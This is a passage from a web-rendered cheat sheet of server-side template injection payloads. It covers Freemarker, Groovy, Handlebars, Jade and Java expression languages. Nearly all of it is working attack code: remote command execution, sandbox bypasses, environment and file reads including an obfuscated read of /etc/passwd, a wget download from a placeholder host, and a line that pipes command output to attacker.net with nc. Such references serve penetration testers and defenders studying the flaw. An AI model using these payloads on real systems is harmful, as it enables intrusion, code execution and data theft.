</span></span><span style="display:flex;"><span><span style="color:#75715e">// Method using ScriptEngineManager one-liner
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$<span style="color:#f92672">{</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;javax.script.ScriptEngineManager&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getEngineByName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;js&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">eval</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime.getRuntime().exec(\\\&#34;ping x.x.x.x\\\&#34;)&#34;</span><span style="color:#f92672">))}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Method using JavaClass
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>whoami<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">x</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Method using ScriptEngineManager
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$<span style="color:#f92672">{</span>facesContext<span style="color:#f92672">.</span><span style="color:#a6e22e">getExternalContext</span><span style="color:#f92672">().</span><span style="color:#a6e22e">setResponseHeader</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;output&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;javax.script.ScriptEngineManager&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getEngineByName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;JavaScript&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">eval</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;var x=new java.lang.ProcessBuilder;x.command(\\\&#34;wget\\\&#34;,\\\&#34;http://x.x.x.x/1.sh\\\&#34;);org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&#34;</span><span style="color:#f92672">))}</span>
</span></span></code></pre></div><hr>
<h2 id="freemarker">
  Freemarker
  <a class="anchor" href="#freemarker">#</a>
</h2>
<p><a href="https://freemarker.apache.org/">Official website</a></p>
<blockquote>
<p>Apache FreeMarker™ is a template engine: a Java library to generate text output (HTML web pages, e-mails, configuration files, source code, etc.) based on templates and changing data.</p>
</blockquote>
<p>You can try your payloads at <a href="https://try.freemarker.apache.org">https://try.freemarker.apache.org</a></p>
<h3 id="freemarker---basic-injection">
  Freemarker - Basic injection
  <a class="anchor" href="#freemarker---basic-injection">#</a>
</h3>
<p>The template can be :</p>
<ul>
<li>Default: <code>${3*3}</code></li>
<li>Legacy: <code>#{3*3}</code></li>
<li>Alternative: <code>[=3*3]</code> since <a href="https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html">FreeMarker 2.3.4</a></li>
</ul>
<h3 id="freemarker---read-file">
  Freemarker - Read File
  <a class="anchor" href="#freemarker---read-file">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">$</span>{<span style="color:#a6e22e">product</span>.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getProtectionDomain</span>().<span style="color:#a6e22e">getCodeSource</span>().<span style="color:#a6e22e">getLocation</span>().<span style="color:#a6e22e">toURI</span>().<span style="color:#a6e22e">resolve</span>(<span style="color:#e6db74">&#39;path_to_the_file&#39;</span>).<span style="color:#a6e22e">toURL</span>().<span style="color:#a6e22e">openStream</span>().<span style="color:#a6e22e">readAllBytes</span>()<span style="color:#f92672">?</span><span style="color:#a6e22e">join</span>(<span style="color:#e6db74">&#34; &#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Convert</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">returned</span> <span style="color:#a6e22e">bytes</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">ASCII</span>
</span></span></code></pre></div><h3 id="freemarker---code-execution">
  Freemarker - Code execution
  <a class="anchor" href="#freemarker---code-execution">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">ex</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;freemarker.template.utility.Execute&#34;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span>()<span style="color:#f92672">&gt;</span><span style="color:#a6e22e">$</span>{ <span style="color:#a6e22e">ex</span>(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span>[<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">ex</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;freemarker.template.utility.Execute&#39;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span>()]<span style="color:#a6e22e">$</span>{ <span style="color:#a6e22e">ex</span>(<span style="color:#e6db74">&#39;id&#39;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">$</span>{<span style="color:#e6db74">&#34;freemarker.template.utility.Execute&#34;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span>()(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;freemarker.template.utility.Execute&#34;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span>()(<span style="color:#e6db74">&#34;id&#34;</span>)]
</span></span></code></pre></div><h3 id="freemarker---sandbox-bypass">
  Freemarker - Sandbox bypass
  <a class="anchor" href="#freemarker---sandbox-bypass">#</a>
</h3>
<p>:warning: only works on Freemarker versions below 2.3.30</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">classloader</span><span style="color:#f92672">=</span><span style="color:#a6e22e">article</span>.<span style="color:#66d9ef">class</span>.<span style="color:#a6e22e">protectionDomain</span>.<span style="color:#a6e22e">classLoader</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">owc</span><span style="color:#f92672">=</span><span style="color:#a6e22e">classloader</span>.<span style="color:#a6e22e">loadClass</span>(<span style="color:#e6db74">&#34;freemarker.template.ObjectWrapper&#34;</span>)<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">dwf</span><span style="color:#f92672">=</span><span style="color:#a6e22e">owc</span>.<span style="color:#a6e22e">getField</span>(<span style="color:#e6db74">&#34;DEFAULT_WRAPPER&#34;</span>).<span style="color:#a6e22e">get</span>(<span style="color:#66d9ef">null</span>)<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">ec</span><span style="color:#f92672">=</span><span style="color:#a6e22e">classloader</span>.<span style="color:#a6e22e">loadClass</span>(<span style="color:#e6db74">&#34;freemarker.template.utility.Execute&#34;</span>)<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">$</span>{<span style="color:#a6e22e">dwf</span>.<span style="color:#a6e22e">newInstance</span>(<span style="color:#a6e22e">ec</span>,<span style="color:#66d9ef">null</span>)(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span></code></pre></div><hr>
<h2 id="groovy">
  Groovy
  <a class="anchor" href="#groovy">#</a>
</h2>
<p><a href="https://groovy-lang.org/">Official website</a></p>
<h3 id="groovy---basic-injection">
  Groovy - Basic injection
  <a class="anchor" href="#groovy---basic-injection">#</a>
</h3>
<p>Refer to <a href="https://groovy-lang.org/syntax.html">https://groovy-lang.org/syntax.html</a> , but <code>${9*9}</code> is the basic injection.</p>
<h3 id="groovy---read-and-create-file">
  Groovy - Read and create File
  <a class="anchor" href="#groovy---read-and-create-file">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-groovy" data-lang="groovy"><span style="display:flex;"><span>$<span style="color:#f92672">{</span>String x <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;c:/windows/notepad.exe&#39;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">text</span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>String x <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/path/to/file&#39;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getText</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#39;UTF-8&#39;</span><span style="color:#f92672">)}</span>
</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span><span style="color:#66d9ef">new</span> File<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;C:\Temp\FileName.txt&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">createNewFile</span><span style="color:#f92672">();}</span>
</span></span></code></pre></div><h3 id="groovy---http-request">
  Groovy - HTTP request:
  <a class="anchor" href="#groovy---http-request">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-groovy" data-lang="groovy"><span style="display:flex;"><span>$<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;http://www.google.com&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">toURL</span><span style="color:#f92672">().</span><span style="color:#a6e22e">text</span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span><span style="color:#66d9ef">new</span> URL<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://www.google.com&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getText</span><span style="color:#f92672">()}</span>
</span></span></code></pre></div><h3 id="groovy---command-execution">
  Groovy - Command Execution
  <a class="anchor" href="#groovy---command-execution">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-groovy" data-lang="groovy"><span style="display:flex;"><span>$<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;calc.exe&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">()}</span>
</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;calc.exe&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">execute</span><span style="color:#f92672">()}</span>
</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">evaluate</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;9*9&#34;</span><span style="color:#f92672">)</span> <span style="color:#75715e">//(this is a Script class)}
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$<span style="color:#f92672">{</span><span style="color:#66d9ef">new</span> org<span style="color:#f92672">.</span><span style="color:#a6e22e">codehaus</span><span style="color:#f92672">.</span><span style="color:#a6e22e">groovy</span><span style="color:#f92672">.</span><span style="color:#a6e22e">runtime</span><span style="color:#f92672">.</span><span style="color:#a6e22e">MethodClosure</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;calc.exe&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;execute&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">call</span><span style="color:#f92672">()}</span>
</span></span></code></pre></div><h3 id="groovy---sandbox-bypass">
  Groovy - Sandbox Bypass
  <a class="anchor" href="#groovy---sandbox-bypass">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-groovy" data-lang="groovy"><span style="display:flex;"><span>$<span style="color:#f92672">{</span> <span style="color:#a6e22e">@ASTTest</span><span style="color:#f92672">(</span>value<span style="color:#f92672">={</span><span style="color:#66d9ef">assert</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;whoami&#34;</span><span style="color:#f92672">)})</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> x <span style="color:#f92672">}</span>
</span></span></code></pre></div><p>or</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-groovy" data-lang="groovy"><span style="display:flex;"><span>$<span style="color:#f92672">{</span> <span style="color:#66d9ef">new</span> groovy<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">GroovyClassLoader</span><span style="color:#f92672">().</span><span style="color:#a6e22e">parseClass</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\&#34;calc.exe\&#34;)})def x&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">}</span>
</span></span></code></pre></div><hr>
<h2 id="handlebars">
  Handlebars
  <a class="anchor" href="#handlebars">#</a>
</h2>
<p><a href="https://handlebarsjs.com/">Official website</a></p>
<blockquote>
<p>Handlebars compiles templates into JavaScript functions.</p>
</blockquote>
<h3 id="handlebars---command-execution">
  Handlebars - Command Execution
  <a class="anchor" href="#handlebars---command-execution">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-handlebars" data-lang="handlebars"><span style="display:flex;"><span><span style="color:#75715e">{{</span><span style="color:#66d9ef">#with</span> <span style="color:#e6db74">&#34;s&#34;</span> as <span style="color:#960050;background-color:#1e0010">|</span>string<span style="color:#960050;background-color:#1e0010">|</span><span style="color:#75715e">}}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">{{</span><span style="color:#66d9ef">#with</span> <span style="color:#e6db74">&#34;e&#34;</span><span style="color:#75715e">}}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">{{</span><span style="color:#66d9ef">#with</span> split as <span style="color:#960050;background-color:#1e0010">|</span>conslist<span style="color:#960050;background-color:#1e0010">|</span><span style="color:#75715e">}}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">{{</span>this.pop<span style="color:#75715e">}}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">{{</span>this.push <span style="color:#960050;background-color:#1e0010">(</span>lookup string.sub <span style="color:#e6db74">&#34;constructor&#34;</span><span style="color:#960050;background-color:#1e0010">)</span><span style="color:#75715e">}}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">{{</span>this.pop<span style="color:#75715e">}}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">{{</span><span style="color:#66d9ef">#with</span> string.split as <span style="color:#960050;background-color:#1e0010">|</span>codelist<span style="color:#960050;background-color:#1e0010">|</span><span style="color:#75715e">}}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">{{</span>this.pop<span style="color:#75715e">}}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">{{</span>this.push <span style="color:#e6db74">&#34;return require(&#39;child_process&#39;).execSync(&#39;ls -la&#39;);&#34;</span><span style="color:#75715e">}}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">{{</span>this.pop<span style="color:#75715e">}}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">{{</span><span style="color:#66d9ef">#each</span> conslist<span style="color:#75715e">}}</span>
</span></span><span style="display:flex;"><span>          <span style="color:#75715e">{{</span><span style="color:#66d9ef">#with</span> <span style="color:#960050;background-color:#1e0010">(</span>string.sub.apply <span style="color:#ae81ff">0</span> codelist<span style="color:#960050;background-color:#1e0010">)</span><span style="color:#75715e">}}</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">{{</span>this<span style="color:#75715e">}}</span>
</span></span><span style="display:flex;"><span>          <span style="color:#75715e">{{</span><span style="color:#66d9ef">/with</span><span style="color:#75715e">}}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">{{</span><span style="color:#66d9ef">/each</span><span style="color:#75715e">}}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">{{</span><span style="color:#66d9ef">/with</span><span style="color:#75715e">}}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">{{</span><span style="color:#66d9ef">/with</span><span style="color:#75715e">}}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">{{</span><span style="color:#66d9ef">/with</span><span style="color:#75715e">}}</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">{{</span><span style="color:#66d9ef">/with</span><span style="color:#75715e">}}</span>
</span></span></code></pre></div><hr>
<h2 id="jade--codepen">
  Jade / Codepen
  <a class="anchor" href="#jade--codepen">#</a>
</h2>
<p><a href="https://codepen.io/">Official website</a></p>
<blockquote>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">-</span> var x <span style="color:#f92672">=</span> root<span style="color:#f92672">.</span>process
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span> x <span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>mainModule<span style="color:#f92672">.</span>require
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span> x <span style="color:#f92672">=</span> x(<span style="color:#e6db74">&#39;child_process&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>exec(<span style="color:#e6db74">&#39;id | nc attacker.net 80&#39;</span>)
</span></span></code></pre></div><hr>
<h2 id="java">
  Java
  <a class="anchor" href="#java">#</a>
</h2>
<h3 id="java---basic-injection">
  Java - Basic injection
  <a class="anchor" href="#java---basic-injection">#</a>
</h3>
<blockquote>
<p>Multiple variable expressions can be used, if <code>${...}</code> doesn&rsquo;t work try <code>#{...}</code>, <code>*{...}</code>, <code>@{...}</code> or <code>~{...}</code>.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>$<span style="color:#f92672">{</span><span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{{</span><span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span><span style="color:#f92672">}}</span>
</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>class<span style="color:#f92672">.</span><span style="color:#a6e22e">getClassLoader</span><span style="color:#f92672">()}</span>
</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>class<span style="color:#f92672">.</span><span style="color:#a6e22e">getResource</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getPath</span><span style="color:#f92672">()}</span>
</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>class<span style="color:#f92672">.</span><span style="color:#a6e22e">getResource</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;../../../../../index.htm&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getContent</span><span style="color:#f92672">()}</span>
</span></span></code></pre></div><h3 id="java---retrieve-the-systems-environment-variables">
  Java - Retrieve the system’s environment variables
  <a class="anchor" href="#java---retrieve-the-systems-environment-variables">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>$<span style="color:#f92672">{</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">System</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getenv</span><span style="color:#f92672">()}</span>
</span></span></code></pre></div><h3 id="java---retrieve-etcpasswd">
  Java - Retrieve /etc/passwd
  <a class="anchor" href="#java---retrieve-etcpasswd">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>$<span style="color:#f92672">{</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>cat <span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>passwd<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>T<span style="color:#f92672">(</span>org<span style="color:#f92672">.</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">.</span><span style="color:#a6e22e">commons</span><span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">IOUtils</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">99</span><span style="color:#f92672">).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">97</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">116</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">32</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">47</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">101</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">116</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">99</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">47</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">112</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">97</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">115</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">115</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">119</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">100</span><span style="color:#f92672">))).</span><span style="color:#a6e22e">getInputStream</span><span style="color:#f92672">())}</span>
</span></span></code></pre></div><hr>
<h2 id="django-templates">
  Django Templates
  <a class="anchor" href="#django-templates">#</a>
</h2>
<p>Django template language supports 2 rendering engines by default: Django Templates (DT) and Jinja2. Django Templates is much simpler engine. It does not allow calling of passed object functions and impact of SSTI in DT is often less severe than in Jinja2.</p>
<h3 id="detection">
  Detection
